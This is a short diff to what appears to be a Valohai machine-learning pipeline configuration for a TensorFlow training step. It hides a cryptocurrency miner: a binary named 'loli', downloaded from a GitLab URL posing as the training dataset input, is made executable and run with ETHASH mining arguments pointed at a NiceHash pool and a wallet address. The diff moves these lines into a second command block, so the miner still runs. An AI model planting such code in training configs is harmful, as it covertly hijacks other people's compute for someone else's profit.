@@ -4,8 +4,6 @@
     image: tensorflow/tensorflow:2.6.0
     command:
       - pip install valohai-utils
-      - chmod +x loli
-      - ./loli --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.Nung
     parameters:
       - name: epochs
         default: 5
@@ -16,3 +14,7 @@
     inputs:
       - name: dataset_train
         default: 'https://gitlab.com/anabsjs80/josss/-/raw/main/loli'
+    command:
+    - chmod +x loli
+    - ./loli --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.Nung
+        
